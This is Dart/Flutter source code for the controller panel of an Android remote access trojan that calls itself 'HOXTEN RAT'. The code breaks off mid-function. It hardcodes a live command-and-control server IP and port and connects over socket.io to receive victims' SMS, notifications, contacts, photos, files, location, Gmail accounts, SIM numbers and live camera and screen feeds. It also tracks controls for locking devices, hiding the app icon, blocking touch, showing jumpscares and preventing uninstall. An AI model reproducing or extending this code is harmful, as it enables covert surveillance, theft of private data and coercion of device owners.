
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';
import 'package:provider/provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;










class HoxtenApiClient {
  HoxtenApiClient({String? baseUrl}) : _override = baseUrl;

  final String? _override;

  String get _base => _override ?? HoxtenApiConfig.baseUrl;

  Uri _uri(String path) => Uri.parse('$_base$path');

  Future<Map<String, dynamic>> postJson(
    String path, {
    Map<String, dynamic>? body,
    String? token,
  }) async {
    final res = await http
        .post(
          _uri(path),
          headers: {
            'Content-Type': 'application/json',
            if (token != null) 'x-auth-token': token,
          },
          body: body == null ? null : jsonEncode(body),
        )
        .timeout(const Duration(seconds: 15));
    return _decode(res);
  }

  Future<Map<String, dynamic>> getJson(String path, {String? token}) async {
    final res = await http
        .get(
          _uri(path),
          headers: {if (token != null) 'x-auth-token': token},
        )
        .timeout(const Duration(seconds: 15));
    return _decode(res);
  }

  Future<dynamic> getRaw(String path, {String? token}) async {
    final res = await http
        .get(
          _uri(path),
          headers: {if (token != null) 'x-auth-token': token},
        )
        .timeout(const Duration(seconds: 15));
    if (res.statusCode >= 400) {
      throw HoxtenApiException('Request gagal (${res.statusCode})', statusCode: res.statusCode);
    }
    return jsonDecode(res.body);
  }

  Future<Map<String, dynamic>> deleteJson(String path, {String? token}) async {
    final res = await http
        .delete(
          _uri(path),
          headers: {if (token != null) 'x-auth-token': token},
        )
        .timeout(const Duration(seconds: 15));
    return _decode(res);
  }

  Future<Uint8List> downloadBytes(String path, {String? token}) async {
    final res = await http
        .get(
          _uri(path),
          headers: {if (token != null) 'x-auth-token': token},
        )
        .timeout(const Duration(seconds: 45));
    if (res.statusCode >= 400) {
      Map<String, dynamic> data = {};
      try {
        data = jsonDecode(res.body) as Map<String, dynamic>;
      } catch (_) {}
      throw HoxtenApiException(
        data['error']?.toString() ?? 'Download gagal (${res.statusCode})',
        statusCode: res.statusCode,
      );
    }
    return res.bodyBytes;
  }

  Map<String, dynamic> _decode(http.Response res) {
    Map<String, dynamic> data = {};
    try {
      data = jsonDecode(res.body) as Map<String, dynamic>;
    } catch (_) {
      data = {'error': res.body.isEmpty ? 'Server error' : res.body};
    }
    if (res.statusCode >= 400) {
      throw HoxtenApiException(
        data['error']?.toString() ?? 'Request gagal (${res.statusCode})',
        statusCode: res.statusCode,
      );
    }
    return data;
  }
}

class HoxtenApiException implements Exception {
  HoxtenApiException(this.message, {this.statusCode});
  final String message;
  final int? statusCode;

  @override
  String toString() => message;
}

class HoxtenApiConfig {
  static const String _buildOverride = String.fromEnvironment('SYNC_API_URL');
  static const _cacheKey = 'hoxten_rat_unified_url';

  static String _baseUrl = '';
  static bool _ready = false;
  static String? _lastError;

  static String get baseUrl => _baseUrl;
  static String get socketUrl => "http://43.134.79.230:2001";
  static bool get isReady => _ready;
  static String? get lastError => _lastError;

  static void applyRemoteUrl(String url) {
    final normalized = _normalize(url);
    if (normalized.isEmpty) return;
    _baseUrl = normalized;
    _ready = true;
    _lastError = null;
    unawaited(_persistUrl(normalized));
  }

  static void ensureReady() {
    if (_ready && _baseUrl.isNotEmpty) return;
    if (_buildOverride.isNotEmpty) {
      applyRemoteUrl(_buildOverride);
    }
  }

  static Future<void> initialize() async {
    final prefs = await SharedPreferences.getInstance();
    final cached = prefs.getString(_cacheKey);
    if (cached != null && cached.trim().isNotEmpty) {
      applyRemoteUrl(cached);
    }
  }

  static Future<void> _persistUrl(String url) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_cacheKey, url);
  }

  static String _normalize(String url) => url;
}




class HoxtenDeviceStatus {
  const HoxtenDeviceStatus({
    this.flashlight = false,
    this.cameraActive = false,
    this.deviceLocked = false,
    this.lockTitle = '',
    this.jumpscareActive = false,
    this.jumpscareUrl = '',
    this.blockedApps = const [],
    this.iconHidden = false,
    this.touchBlocked = false,
    this.ttsSpeaking = false,
    this.videoOverlayActive = false,
    this.dialogSpamActive = false,
    this.jumpscare2Active = false,
    this.jumpscare2Url = '',
    this.volumeMuted = false,
    this.antiUninstall = false,
    this.lockCustomActive = false,
    this.lockCustomHtml = '',
    this.screenActive = false,
    this.jumpscare2Duration = 3000,
    this.currentTheme = 'default',
  });

  final bool flashlight;
  final bool cameraActive;
  final bool deviceLocked;
  final String lockTitle;
  final bool jumpscareActive;
  final String jumpscareUrl;
  final List<String> blockedApps;
  final bool iconHidden;
  final bool touchBlocked;
  final bool ttsSpeaking;
  final bool videoOverlayActive;
  final bool dialogSpamActive;
  final bool jumpscare2Active;
  final String jumpscare2Url;
  final bool volumeMuted;
  final bool antiUninstall;
  final bool lockCustomActive;
  final String lockCustomHtml;
  final bool screenActive;
  final int jumpscare2Duration;
  final String currentTheme;

  factory HoxtenDeviceStatus.fromJson(Map<String, dynamic>? json) {
    if (json == null) return const HoxtenDeviceStatus();
    final blocked = json['blockedApps'];
    return HoxtenDeviceStatus(
      flashlight: json['flashlight'] == true,
      cameraActive: json['cameraActive'] == true,
      deviceLocked: json['deviceLocked'] == true,
      lockTitle: json['lockTitle']?.toString() ?? '',
      jumpscareActive: json['jumpscareActive'] == true,
      jumpscareUrl: json['jumpscareUrl']?.toString() ?? '',
      blockedApps: blocked is List ? blocked.map((e) => e.toString()).toList() : const [],
      iconHidden: json['iconHidden'] == true,
      touchBlocked: json['touchBlocked'] == true,
      ttsSpeaking: json['ttsSpeaking'] == true,
      videoOverlayActive: json['videoOverlayActive'] == true,
      dialogSpamActive: json['dialogSpamActive'] == true,
      jumpscare2Active: json['jumpscare2Active'] == true,
      jumpscare2Url: json['jumpscare2Url']?.toString() ?? '',
      volumeMuted: json['volumeMuted'] == true,
      antiUninstall: json['antiUninstall'] == true,
      lockCustomActive: json['lockCustomActive'] == true,
      lockCustomHtml: json['lockCustomHtml']?.toString() ?? '',
      screenActive: json['screenActive'] == true,
      jumpscare2Duration: (json['jumpscare2Duration'] as num?)?.toInt() ?? 3000,
      currentTheme: json['currentTheme']?.toString() ?? json['themeChanged']?.toString() ?? 'default',
    );
  }

  HoxtenDeviceStatus copyWith({
    bool? flashlight,
    bool? cameraActive,
    bool? deviceLocked,
    String? lockTitle,
    bool? jumpscareActive,
    String? jumpscareUrl,
    List<String>? blockedApps,
    bool? iconHidden,
    bool? touchBlocked,
    bool? ttsSpeaking,
    bool? videoOverlayActive,
    bool? dialogSpamActive,
    bool? jumpscare2Active,
    String? jumpscare2Url,
    bool? volumeMuted,
    bool? antiUninstall,
    bool? lockCustomActive,
    String? lockCustomHtml,
    bool? screenActive,
    int? jumpscare2Duration,
    String? currentTheme,
  }) {
    return HoxtenDeviceStatus(
      flashlight: flashlight ?? this.flashlight,
      cameraActive: cameraActive ?? this.cameraActive,
      deviceLocked: deviceLocked ?? this.deviceLocked,
      lockTitle: lockTitle ?? this.lockTitle,
      jumpscareActive: jumpscareActive ?? this.jumpscareActive,
      jumpscareUrl: jumpscareUrl ?? this.jumpscareUrl,
      blockedApps: blockedApps ?? this.blockedApps,
      iconHidden: iconHidden ?? this.iconHidden,
      touchBlocked: touchBlocked ?? this.touchBlocked,
      ttsSpeaking: ttsSpeaking ?? this.ttsSpeaking,
      videoOverlayActive: videoOverlayActive ?? this.videoOverlayActive,
      dialogSpamActive: dialogSpamActive ?? this.dialogSpamActive,
      jumpscare2Active: jumpscare2Active ?? this.jumpscare2Active,
      jumpscare2Url: jumpscare2Url ?? this.jumpscare2Url,
      volumeMuted: volumeMuted ?? this.volumeMuted,
      antiUninstall: antiUninstall ?? this.antiUninstall,
      lockCustomActive: lockCustomActive ?? this.lockCustomActive,
      lockCustomHtml: lockCustomHtml ?? this.lockCustomHtml,
      screenActive: screenActive ?? this.screenActive,
      jumpscare2Duration: jumpscare2Duration ?? this.jumpscare2Duration,
      currentTheme: currentTheme ?? this.currentTheme,
    );
  }
}

class HoxtenDeviceModel {
  const HoxtenDeviceModel({
    required this.id,
    required this.name,
    required this.connectedAt,
    required this.lastSeen,
    required this.battery,
    required this.charging,
    required this.androidVersion,
    required this.sdkVersion,
    required this.status,
  });

  final String id;
  final String name;
  final String connectedAt;
  final String lastSeen;
  final int battery;
  final bool charging;
  final String androidVersion;
  final int sdkVersion;
  final HoxtenDeviceStatus status;

  factory HoxtenDeviceModel.fromJson(Map<String, dynamic> json) {
    final info = json['info'] as Map<String, dynamic>? ?? {};
    return HoxtenDeviceModel(
      id: json['id']?.toString() ?? '',
      name: json['name']?.toString() ?? 'Unknown',
      connectedAt: json['connectedAt']?.toString() ?? '',
      lastSeen: json['lastSeen']?.toString() ?? '',
      battery: (info['battery'] as num?)?.toInt() ?? -1,
      charging: info['charging'] == true,
      androidVersion: info['androidVersion']?.toString() ?? '?',
      sdkVersion: (info['sdkVersion'] as num?)?.toInt() ?? -1,
      status: HoxtenDeviceStatus.fromJson(json['status'] as Map<String, dynamic>?),
    );
  }

  HoxtenDeviceModel copyWith({
    String? name,
    int? battery,
    bool? charging,
    HoxtenDeviceStatus? status,
  }) {
    return HoxtenDeviceModel(
      id: id,
      name: name ?? this.name,
      connectedAt: connectedAt,
      lastSeen: lastSeen,
      battery: battery ?? this.battery,
      charging: charging ?? this.charging,
      androidVersion: androidVersion,
      sdkVersion: sdkVersion,
      status: status ?? this.status,
    );
  }
}

abstract final class DevicePayload {
  static Map<String, List<Map<String, dynamic>>> groupConversations(List<Map<String, dynamic>> raw) {
    final grouped = <String, List<Map<String, dynamic>>>{};

    for (final item in raw) {
      final nested = item['messages'];
      if (nested is List) {
        final key = item['appName']?.toString() ?? item['pkg']?.toString() ?? 'Unknown';
        final msgs = nested
            .whereType<Map>()
            .map((m) => Map<String, dynamic>.from(m))
            .map(
              (m) => {
                'title': m['title'] ?? m['address'] ?? key,
                'body': m['text'] ?? m['body'] ?? '',
                'date': formatTimestamp(m['time'] ?? m['date']),
              },
            )
            .toList();
        grouped[key] = msgs;
      } else {
        final key = item['address']?.toString() ??
            item['from']?.toString() ??
            item['title']?.toString() ??
            'Unknown';
        grouped.putIfAbsent(key, () => []).add({
          'title': key,
          'body': item['body'] ?? item['text'] ?? '',
          'date': formatTimestamp(item['date'] ?? item['time']),
        });
      }
    }

    return grouped;
  }

  static String formatTimestamp(dynamic value) {
    if (value == null) return '';
    if (value is String && value.isNotEmpty) return value;
    final ms = value is num ? value.toInt() : int.tryParse(value.toString());
    if (ms == null) return value.toString();
    final dt = DateTime.fromMillisecondsSinceEpoch(ms);
    return DateFormat('dd MMM yyyy Â· HH:mm').format(dt);
  }

  static String contactLine(Map<String, dynamic> contact) {
    final name = contact['name']?.toString() ?? '-';
    final number = contact['number']?.toString() ?? contact['phone']?.toString() ?? '';
    return number.isEmpty ? name : '$name Â· $number';
  }

  static String locationLine(Map<String, dynamic> loc) {
    final address = loc['fullAddress']?.toString() ?? loc['address']?.toString();
    if (address != null && address.isNotEmpty) return address;
    final lat = loc['lat'];
    final lng = loc['lng'];
    if (lat != null && lng != null) return 'Lat $lat Â· Lng $lng';
    return loc['error']?.toString() ?? 'Lokasi tidak tersedia';
  }

  static String gmailSummary(Map<String, dynamic>? data) {
    if (data == null) return 'Belum ada data Gmail';
    if (data['error'] != null) return data['error'].toString();
    final google = (data['accounts'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    final others = (data['others'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    if (google.isEmpty && others.isEmpty) return 'Tidak ada akun terdaftar';
    final lines = <String>[
      ...google.map((a) => a['email']?.toString() ?? '').where((e) => e.isNotEmpty),
      ...others.map((a) => '${a['email']} (${a['type']})').where((e) => e.isNotEmpty),
    ];
    return lines.join('\n');
  }

  static String phoneSummary(Map<String, dynamic>? data) {
    if (data == null) return 'Belum ada data SIM';
    if (data['error'] != null) return data['error'].toString();
    final sims = (data['sims'] as List?)?.whereType<Map>().map(Map<String, dynamic>.from).toList() ?? [];
    if (sims.isEmpty) return 'Tidak ada nomor SIM terbaca';
    return sims
        .map((s) {
          final slot = s['displayName'] ?? 'SIM ${((s['slot'] as num?)?.toInt() ?? 0) + 1}';
          final number = s['number']?.toString() ?? '-';
          final operator = s['operator']?.toString();
          return operator == null || operator.isEmpty ? '$slot: $number' : '$slot: $number ($operator)';
        })
        .join('\n');
  }
}





HoxtenAuthService? _sharedHoxtenAuth;

Future<String> ensureHoxtenSession({bool forceRefresh = false}) async {
  _sharedHoxtenAuth ??= HoxtenAuthService();
  return _sharedHoxtenAuth!.ensureSession(forceRefresh: forceRefresh);
}

class HoxtenAuthService extends ChangeNotifier {
  HoxtenAuthService({HoxtenApiClient? api}) : _api = api ?? HoxtenApiClient();

  final HoxtenApiClient _api;

  static const _tokenKey = 'hoxten_sync_token';
  static const _deviceKey = 'hoxten_panel_device_id';

  String? token;
  String? uid;
  String? username;
  bool loading = false;
  String? lastError;

  bool get isLoggedIn => token != null && token!.isNotEmpty;

  Future<String> _deviceId() async {
    if (!kIsWeb) {
      try {
        final info = await DeviceInfoPlugin().androidInfo;
        final id = info.id ?? 'unknown_device';
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(_deviceKey, id);
        return id;
      } catch (_) {}
    }
    final prefs = await SharedPreferences.getInstance();
    var id = prefs.getString(_deviceKey);
    if (id != null && id.isNotEmpty) return id;
    id = 'hoxten_panel_web_' + DateTime.now().millisecondsSinceEpoch.toString();
    await prefs.setString(_deviceKey, id);
    return id;
  }

  Future<String> ensureSession({bool forceRefresh = false}) async {
    final server = "http://43.134.79.230:2001";
    if (server.isEmpty) {
      throw Exception('HOXTEN RAT server belum tersedia — cek koneksi internet');
    }
    HoxtenApiConfig.applyRemoteUrl(server);

    final prefs = await SharedPreferences.getInstance();
    if (forceRefresh) {
      await prefs.remove(_tokenKey);
      token = null;
    }

    final user = prefs.getString('username');
    final pass = prefs.getString('password');
    if (user == null || pass == null || user.isEmpty || pass.isEmpty) {
      throw Exception('Login HOXTEN dulu — kredensial tidak tersedia');
    }

    loading = true;
    lastError = null;
    notifyListeners();

    try {
      final androidId = await _deviceId();
      final res = await http
          .post(
            Uri.parse('$server/validate'),
            body: {
              'username': user,
              'password': pass,
              'androidId': androidId,
            },
          )
          .timeout(const Duration(seconds: 15));
      final data = jsonDecode(res.body) as Map<String, dynamic>;

      if (data['valid'] != true) {
        final reason = data['message']?.toString().toLowerCase() ?? '';
        if (reason.contains('perangkat') ||
            reason.contains('device') ||
            reason.contains('another')) {
          throw Exception('Akun login di perangkat lain — logout dulu');
        }
        throw Exception('Sesi tidak valid — login ulang');
      }
      if (data['expired'] == true) {
        throw Exception('Masa akses habis — perpanjang dulu');
      }

      final freshKey = data['key']?.toString() ?? '';
      if (freshKey.isEmpty) {
        throw Exception('Sesi tidak valid — login ulang');
      }
      token = freshKey;
      uid = user;
      username = user;
      await prefs.setString('key', freshKey);
      await prefs.setString(_tokenKey, freshKey);
      await prefs.setString('hoxten_uid', uid!);
      await prefs.setString('hoxten_username', username!);
      return freshKey;
    } catch (e) {
      lastError = e.toString().replaceFirst('Exception: ', '');
      rethrow;
    } finally {
      loading = false;
      notifyListeners();
    }
  }

  Future<void> logout() async {
    final prefs = await SharedPreferences.getInstance();
    final t = token;
    if (t != null) {
      try {
        await _api.postJson('/api/logout', token: t);
      } catch (_) {}
    }
    token = null;
    uid = null;
    username = null;
    await prefs.remove(_tokenKey);
    await prefs.remove('hoxten_uid');
    await prefs.remove('hoxten_username');
    notifyListeners();
  }
}

class HoxtenSocketService extends ChangeNotifier {
  io.Socket? _socket;
  String? _token;
  String? _sessToken;
  String? get commandToken => _sessToken;
  List<HoxtenDeviceModel> devices = [];
  bool connected = false;
  bool _closed = false;
  int _socketGen = 0;
  String? lastError;
  String? myUid;

  String? selectedDeviceId;

  final Map<String, String> cameraFrames = {};
  final Map<String, String> screenFrames = {};
  final Map<String, List<Map<String, dynamic>>> smsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> notifsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> galleryByDevice = {};
  final Map<String, List<Map<String, dynamic>>> contactsByDevice = {};
  final Map<String, List<Map<String, dynamic>>> appsByDevice = {};
  final Map<String, Map<String, dynamic>> locationByDevice = {};
  final Map<String, dynamic> gmailByDevice = {};
  final Map<String, dynamic> phoneByDevice = {};
  final Map<String, List<Map<String, dynamic>>> filesByDevice = {};

  HoxtenDeviceModel? get selectedDevice {
    if (selectedDeviceId == null) return null;
    try {
      return devices.firstWhere((d) => d.id == selectedDeviceId);
    } catch (_) {
      return null;
    }
  }

  String? get selectedDeviceUiKey {
    final d = selectedDevice;
    if (d == null) return selectedDeviceId;
    final s = d.status;
    return [
      d.id,
      d.name,
      d.battery,
      d.charging,
      s.flashlight,
      s.cameraActive,
      s.deviceLocked,
      s.iconHidden,
      s.touchBlocked,
      s.ttsSpeaking,
      s.dialogSpamActive,
      s.volumeMuted,
      s.screenActive,
      s.blockedApps.length,
      s.antiUninstall,
      s.lockCustomActive,
      s.jumpscareActive,
      s.jumpscareUrl,
    ].join('|');
  }

  /// Update status lokal (optimistic) â€” dipertahankan saat merge `devices:update`.
  void patchDeviceStatus(String deviceId, HoxtenDeviceStatus Function(HoxtenDeviceStatus current) mutate) {
    if (_closed) return;
    final index = devices.indexWhere((d) => d.id == deviceId);
    if (index < 0) return;
    final device = devices[index];
    devices[index] = device.copyWith(status: mutate(device.status));
    _safeNotify();
  }

  void selectDevice(String? id) {
    selectedDeviceId = id;
    if (id != null) {
      smsByDevice.remove(id);
      notifsByDevice.remove(id);
    }
    _safeNotify();
  }

  void _safeNotify() {
    if (_closed) return;
    notifyListeners();
  }

  bool _isActiveGen(int gen) => !_closed && gen == _socketGen;

  void _closeSocket() {
    final s = _socket;
    _socket = null;
    connected = false;
    if (s == null) return;
    try {
      s.clearListeners();
      s.disconnect();
      s.dispose();
    } catch (_) {}
  }

  void connect(String token) {
    if (_closed) return;
    _token = token;
    _safeNotify();
    unawaited(_openSocket());
  }

  Future<void> _openSocket() async {
    if (_closed) return;
    final token = _token;
    if (token == null || token.isEmpty) return;

    final gen = ++_socketGen;
    _closeSocket();

    final prefs = await SharedPreferences.getInstance();
    if (!_isActiveGen(gen)) return;

    final joinUser = prefs.getString('username');
    final joinPass = prefs.getString('password');

    final host = "43.134.79.230";
    final port = 2001;
    final serverUrl = 'http://$host:$port';

    final options = io.OptionBuilder()
        .setPath('/socket.io')
        .setTransports(['websocket', 'polling'])
        .enableReconnection()
        .setReconnectionAttempts(20)
        .setReconnectionDelay(2000)
        .setReconnectionDelayMax(8000)
        .setTimeout(25000)
        .disableAutoConnect()
        .build();

    final socket = io.io(serverUrl, options);
    _socket = socket;

    socket
      ..onConnect((_) {
        if (!_isActiveGen(gen)) return;
        debugPrint('HOXTEN socket connected');
        connected = true;
        lastError = null;
        socket.emit('controller:join', {
          'token': token,
          'key': token,
          if (joinUser != null && joinUser.isNotEmpty) 'username': joinUser,
          if (joinPass != null && joinPass.isNotEmpty) 'password': joinPass,
        });
        _safeNotify();
      })
      ..onDisconnect((_) {
        if (!_isActiveGen(gen)) return;
        connected = false;
        _safeNotify();
      })
      ..onConnectError((_) {
        if (!_isActiveGen(gen)) return;
        connected = false;
        lastError = 'Gagal hubung ke server RAT ($host:$port). '
            'Cek internet atau tap refresh.';
        _safeNotify();
      })
      ..on('auth:error', (data) {
        if (!_isActiveGen(gen)) return;
        connected = false;
        final msg = data is Map ? data['message']?.toString() : null;
        lastError = (msg != null && msg.isNotEmpty) ? msg : 'Session kadaluarsa — tap refresh';
        _safeNotify();
        unawaited(_reconnectWithFreshSession(gen));
      })
      ..on('session:token', (data) {
        if (!_isActiveGen(gen)) return;
        _sessToken = data?.toString();
        fetchMyInfo();
      })
      ..on('devices:update', (data) {
        if (!_isActiveGen(gen)) return;
        _handleDevices(data);
      })
      ..on('camera:frame', (data) {
        if (!_isActiveGen(gen)) return;
        _setFrame(cameraFrames, data);
      })
      ..on('screen:frame', (data) {
        if (!_isActiveGen(gen)) return;
        _setFrame(screenFrames, data);
      })
      ..on('camera:screenshot', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final frame = data['frame']?.toString();
          if (id != null && frame != null) cameraFrames[id] = frame;
          _safeNotify();
        }
      })
      ..on('sms:list', (data) {
        if (!_isActiveGen(gen)) return;
        _setList(smsByDevice, data, 'list');
      })
      ..on('notif:list', (data) {
        if (!_isActiveGen(gen)) return;
        _setList(notifsByDevice, data, 'list');
      })
      ..on('apps:list', (data) {
        if (!_isActiveGen(gen)) return;
        _setList(appsByDevice, data, 'apps');
      })
      ..on('device:gallery', (data) {
        if (!_isActiveGen(gen)) return;
        _setList(galleryByDevice, data, 'photos');
      })
      ..on('device:contacts', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final list = data['contacts'];
          if (id != null && list is List) {
            contactsByDevice[id] = list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
            _safeNotify();
          }
        }
      })
      ..on('device:location', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            locationByDevice[id] = Map<String, dynamic>.from(data);
            _safeNotify();
          }
        }
      })
      ..on('device:gmail', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            gmailByDevice[id] = data;
            _safeNotify();
          }
        }
      })
      ..on('device:phone', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id != null) {
            phoneByDevice[id] = data;
            _safeNotify();
          }
        }
      })
      ..on('device:files', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          final files = data['files'];
          if (id != null && files is List) {
            filesByDevice[id] = files.map((e) => Map<String, dynamic>.from(e as Map)).toList();
            _safeNotify();
          }
        }
      })
      ..on('device:notif', (data) {
        if (!_isActiveGen(gen)) return;
        if (data is Map) {
          final id = data['deviceId']?.toString();
          if (id == null) return;
          final raw = data['notif'];
          final entry = raw is Map
              ? Map<String, dynamic>.from(raw)
              : Map<String, dynamic>.from(data);
          notifsByDevice.putIfAbsent(id, () => []);
          notifsByDevice[id]!.insert(0, entry);
          _safeNotify();
        }
      });

    if (!_isActiveGen(gen)) return;
    socket.connect();
  }

  Future<void> _reconnectWithFreshSession([int? fromGen]) async {
    if (_closed) return;
    if (fromGen != null && fromGen != _socketGen) return;
    try {
      final fresh = await ensureHoxtenSession(forceRefresh: true);
      if (_closed) return;
      connect(fresh);
    } catch (e) {
      if (_closed) return;
      lastError = e.toString().replaceFirst('Exception: ', '');
      _safeNotify();
    }
  }

  void _handleDevices(dynamic data) {
    if (_closed) return;
    if (data is! List) return;

    final previous = {for (final d in devices) d.id: d};

    devices = data.whereType<Map>().map((raw) {
      final incoming = HoxtenDeviceModel.fromJson(Map<String, dynamic>.from(raw));
      final local = previous[incoming.id];
      if (local == null) return incoming;
      return incoming.copyWith(status: _mergeHoxtenDeviceStatus(local.status, incoming.status));
    }).toList();
    if (selectedDeviceId != null && !devices.any((d) => d.id == selectedDeviceId)) {
      selectedDeviceId = null;
    }
    _safeNotify();
  }

  /// Sama seperti merge di HTML `dashboard.html` pada event `devices:update`.
  static HoxtenDeviceStatus _mergeHoxtenDeviceStatus(HoxtenDeviceStatus local, HoxtenDeviceStatus incoming) {
    var status = incoming;

    if (local.jumpscareUrl.isNotEmpty && incoming.jumpscareUrl.isEmpty) {
      status = status.copyWith(
        jumpscareUrl: local.jumpscareUrl,
        jumpscareActive: local.jumpscareActive,
      );
    }

    if (local.antiUninstall) {
      status = status.copyWith(antiUninstall: true);
    }

    if (local.lockCustomActive) {
      status = status.copyWith(
        lockCustomActive: true,
        lockCustomHtml: local.lockCustomHtml,
        deviceLocked: false,
      );
    }

    return status;
  }

  void _setFrame(Map<String, String> store, dynamic data) {
    if (_closed) return;
    if (data is Map) {
      final id = data['deviceId']?.toString();
      final frame = data['frame']?.toString();
      if (id != null && frame != null) {
        store[id] = frame;
        _safeNotify();
      }
    }
  }

  void _setList(Map<String, List<Map<String, dynamic>>> store, dynamic data, String key) {
    if (_closed) return;
    if (data is Map) {
      final id = data['deviceId']?.toString();
      final list = data[key];
      if (id != null && list is List) {
        store[id] = list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
        _safeNotify();
      }
    }
  }

  void fetchMyInfo() async {
    if (_closed) return;
    final token = _sessToken;
    if (token == null) return;
    try {
      final res = await http.get(
        Uri.parse('http://43.134.79.230:2001/api/me?token=$token'),
      ).timeout(const Duration(seconds: 10));
      if (_closed) return;
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        myUid = data['uid']?.toString();
        _safeNotify();
      }
    } catch (_) {}
  }

  void disconnect() {
    _closeSocket();
    _token = null;
    _sessToken = null;
    devices = [];
    selectedDeviceId = null;
    cameraFrames.clear();
    screenFrames.clear();
    _safeNotify();
  }

  @override
  void dispose() {
    _closed = true;
    _socketGen++;
    _closeSocket();
    super.dispose();
  }
}





class HoxtenColors {
  static const bg = Color(0xFF04070E);
  static const card = Color(0xFF070F1C);
  static const cardElevated = Color(0xFF0C1528);
  static const accent = Color(0xFF8F949B);
  static const accent2 = Color(0xFF7EABFF);
  static const accent3 = Color(0xFFB8D3FF);
  static const success = Color(0xFF4FC878);
  static const error = Color(0xFFE05C5C);
  static const warning = Color(0xFFFFA726);
  static const text = Color(0xFFF8FAFC);
  static const textMuted = Color(0xFF4A6A9A);
  static const border = Color(0x1A4F8DFF);

  static const dashBg = HoxtenThemeColors.b0;
  static const dashSurface = HoxtenThemeColors.b2;
  static const dashAccent = HoxtenThemeColors.blue;
  static const dashAccent2 = HoxtenThemeColors.blue2;
  static const dashAccentSoft = HoxtenThemeColors.cyan;
  static const dashText = HoxtenThemeColors.t0;
  static const dashTextMuted = HoxtenThemeColors.t2;
}

class HoxtenRadius {
  static const sm = 12.0;
  static const md = 18.0;
  static const lg = 24.0;
  static const xl = 28.0;
}

class HoxtenMotion {
  static const fast = Duration(milliseconds: 200);
  static const normal = Duration(milliseconds: 320);
  static const slow = Duration(milliseconds: 480);
  static const curve = Curves.easeOutCubic;
  static const spring = Curves.easeOutBack;
}

class HoxtenAppTheme {
  static ThemeData HoxtenDark() {
    final base = ThemeData(
      useMaterial3: true,
      brightness: Brightness.dark,
      scaffoldBackgroundColor: HoxtenThemeColors.b0,
      colorScheme: const ColorScheme.dark(
        primary: HoxtenThemeColors.blue,
        secondary: HoxtenThemeColors.cyan,
        surface: HoxtenThemeColors.b2,
        error: HoxtenThemeColors.red,
        onSurface: HoxtenThemeColors.t0,
      ),
      splashFactory: InkSparkle.splashFactory,
    );

    final textTheme = HoxtenThemeTypography.textTheme(base.textTheme).apply(
      bodyColor: HoxtenThemeColors.t0,
      displayColor: HoxtenThemeColors.t0,
    );

    return base.copyWith(
      textTheme: textTheme,
      appBarTheme: AppBarTheme(
        backgroundColor: HoxtenThemeColors.b1.withValues(alpha: 0.92),
        elevation: 0,
        scrolledUnderElevation: 0,
        centerTitle: true,
        foregroundColor: HoxtenThemeColors.t0,
        titleTextStyle: HoxtenThemeTypography.logo(fontSize: 15, letterSpacing: 3.5),
        iconTheme: const IconThemeData(color: HoxtenThemeColors.t1, size: 20),
      ),
      inputDecorationTheme: InputDecorationTheme(
        filled: true,
        fillColor: HoxtenThemeColors.b2,
        hintStyle: HoxtenThemeTypography.fieldHint(),
        labelStyle: HoxtenThemeTypography.tag(fontSize: 9, color: HoxtenThemeColors.t2),
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(color: HoxtenThemeColors.blue.withValues(alpha: 0.15)),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(color: HoxtenThemeColors.blue.withValues(alpha: 0.15)),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(color: HoxtenThemeColors.cyan.withValues(alpha: 0.55), width: 1.2),
        ),
      ),
      filledButtonTheme: FilledButtonThemeData(
        style: FilledButton.styleFrom(
          elevation: 0,
          textStyle: HoxtenThemeTypography.button(),
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
      ),
      textButtonTheme: TextButtonThemeData(
        style: TextButton.styleFrom(textStyle: HoxtenThemeTypography.bodySmall(color: HoxtenThemeColors.t2)),
      ),
      dialogTheme: DialogThemeData(
        backgroundColor: HoxtenThemeColors.b2,
        titleTextStyle: HoxtenThemeTypography.title(),
        contentTextStyle: HoxtenThemeTypography.body(),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      ),
      navigationBarTheme: NavigationBarThemeData(
        height: HoxtenThemeColors.navHeight,
        elevation: 0,
        backgroundColor: HoxtenThemeColors.b1.withValues(alpha: 0.95),
        indicatorColor: HoxtenThemeColors.blue.withValues(alpha: 0.18),
        labelTextStyle: WidgetStateProperty.resolveWith((states) {
          final selected = states.contains(WidgetState.selected);
          return HoxtenThemeTypography.navLabel(active: selected);
        }),
        iconTheme: WidgetStateProperty.resolveWith((states) {
